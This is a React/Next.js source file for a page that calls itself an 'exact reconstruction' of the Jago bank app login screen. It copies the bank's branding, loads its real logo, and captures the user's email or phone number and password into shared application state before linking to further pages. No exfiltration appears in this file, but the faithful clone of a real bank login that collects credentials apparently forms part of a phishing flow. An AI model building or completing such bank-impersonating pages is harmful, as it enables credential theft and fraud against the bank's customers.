"use client";

import React, { useState } from "react";
import Link from "next/link";
import { ChevronDown, User, Lock, EyeOff } from "lucide-react";
import { useApp } from "../../lib/AppContext";

/**
 * Jago Login Page - Exact reconstruction.
 */
export default function Page2() {
  const { appData, updateAppData } = useApp();
  const [showPassword, setShowPassword] = useState(false);

  return (
    <div className="relative min-h-screen w-full bg-white overflow-hidden flex flex-col font-sans text-slate-900">
      
      {/* Background Decorative Elements - Use absolute positioning without negative Z if possible or ensure parent has z-context */}
      <div className="absolute inset-0 pointer-events-none overflow-hidden">
        {/* 1. Warm Orange/Amber Top-Right Gradient Circle */}
        <div className="absolute top-[-30%] right-[-30%] w-[160%] aspect-square bg-gradient-to-bl from-[#FFB800]/40 via-[#FFF8E6]/80 to-transparent rounded-full blur-[120px]" />
        
        {/* 2. Middle-Right Yellow Circle (next to divider) */}
        <div className="absolute top-[64%] right-[-40px] w-32 h-32 bg-[#F1B800] rounded-full" />
        
        {/* 3. Small Floating Dots */}
        {/* Middle-Right Pink Dot */}
        <div className="absolute top-[40.5%] right-[9%] w-[22px] h-[22px] bg-[#E92356] rounded-full" />
        
        {/* Bottom-Left Purple Dot */}
        <div className="absolute bottom-[6%] left-[18%] w-[20px] h-[20px] bg-[#AB1BE4] rounded-full" />
        
        {/* Bottom-Right Red Dot */}
        <div className="absolute bottom-[10.5%] right-[16%] w-[18px] h-[18px] bg-[#F1334E] rounded-full" />
      </div>

      {/* Content Container - Ensure it is above background */}
      <div className="relative z-10 flex flex-col flex-1">
        {/* Top Navigation Bar */}
        <header className="w-full px-6 py-8 flex items-center justify-between">
          <div className="flex items-center gap-2">
            <div className="w-10 h-10 bg-white rounded-xl shadow-[0_4px_12px_rgba(0,0,0,0.08)] border border-slate-50 flex items-center justify-center">
              <div className="text-[#F1B800] font-black text-2xl leading-none">J</div>
            </div>
            <ChevronDown className="w-5 h-5 text-slate-300" />
          </div>
          
          <div className="w-10 h-10 bg-white rounded-xl shadow-[0_4px_12px_rgba(0,0,0,0.08)] border border-slate-50 flex items-center justify-center p-2.5">
            <div className="flex flex-col w-full h-full rounded-[2px] overflow-hidden border border-slate-100">
              <div className="bg-red-500 h-1/2 w-full" />
              <div className="bg-white h-1/2 w-full" />
            </div>
          </div>
        </header>

        {/* Main Content */}
        <main className="flex-1 flex flex-col px-6 pt-2 pb-12 w-full max-w-md mx-auto">
          
          {/* Version & Headline */}
          <div className="mb-10 text-left">
            <div className="text-slate-400 text-[11px] font-bold mb-1 tracking-tight">V 8.83.0 (9297)</div>
            <div className="flex flex-col">
              <h1 className="text-[36px] font-bold text-slate-800 leading-[1.1]">Halo dari</h1>
              <div className="mt-2 h-10 relative">
                <img 
                  src="https://www.jago.com/images/brand/logo-jago.svg" 
                  alt="Jago Logo" 
                  className="h-full object-contain"
                />
              </div>
            </div>
            <p className="text-slate-500 text-[14px] mt-6 leading-[1.6] max-w-[280px] font-medium">
              Semua jadi Jago. Hidup seutuhnya dengan keluarga dan kerabat. <br/>
              Sekarang, Esok, Bersama-sama.
            </p>
          </div>

          {/* Login Card */}
          <div className="bg-white rounded-2xl p-4 shadow-[0_20px_50px_-20px_rgba(0,0,0,0.12)] border border-slate-50 mb-8 space-y-1">
            <div className="relative flex items-center px-4 py-4 bg-[#F8F9FB] rounded-xl">
              <User className="w-6 h-6 text-slate-300 mr-4" />
              <input 
                type="text" 
                placeholder="Email atau nomor ponsel" 
                value={appData.email || ""}
                onChange={(e) => updateAppData({ email: e.target.value })}
                className="flex-1 bg-transparent border-none focus:outline-none text-slate-800 placeholder:text-slate-400 text-sm font-medium"
              />
            </div>
            <div className="relative flex items-center px-4 py-4 bg-[#F8F9FB] rounded-xl">
              <Lock className="w-6 h-6 text-slate-300 mr-4" />
              <input 
                type={showPassword ? "text" : "password"} 
                placeholder="Password" 
                value={appData.password || ""}
                onChange={(e) => updateAppData({ password: e.target.value })}
                className="flex-1 bg-transparent border-none focus:outline-none text-slate-800 placeholder:text-slate-400 text-sm font-medium"
              />
              <button 
                type="button"
                onClick={() => setShowPassword(!showPassword)} 
                className="ml-3 text-slate-900"
              >
                <EyeOff className="w-6 h-6" />
              </button>
            </div>
          </div>

          {/* Divider */}
          <div className="relative flex items-center justify-center mb-10 w-full px-2">
            <div className="flex-1 border-t border-slate-100"></div>
            <span className="px-4 text-[13px] font-bold text-slate-800">atau</span>
            <div className="flex-1 border-t border-slate-100"></div>
          </div>

          {/* Action Buttons */}
          <div className="flex flex-col gap-3.5 mb-2">
            <Link href="/page3" className="w-full">
              <button className="w-full bg-[#FFB800] hover:bg-[#F0AD00] text-black font-black text-base py-5 rounded-xl transition-all shadow-sm active:scale-[0.98]">
                Buat Akun Jago
              </button>
            </Link>
            
            <button className="w-full bg-white border border-[#FFB800] text-black font-black text-base py-5 rounded-xl flex items-center justify-center gap-2 transition-all active:scale-[0.98]">
              <span className="text-slate-800">Saya daftar dari</span> 
              <div className="flex items-center gap-1.5 translate-y-[-1px]">
                <div className="w-6 h-6 flex items-center justify-center relative">
                  <div className="w-5 h-5 bg-green-500 rounded-full flex items-center justify-center">
                    <div className="text-[10px] text-white font-black leading-none">P</div>
                  </div>
                  <div className="absolute top-[-2px] right-[-2px] w-2 h-2 bg-amber-400 rounded-full border border-white" />
                </div>
                <span className="text-green-600 font-black tracking-tighter text-base">Kredit Pintar</span>
              </div>
            </button>
          </div>
        </main>
      </div>
    </div>
  );
}
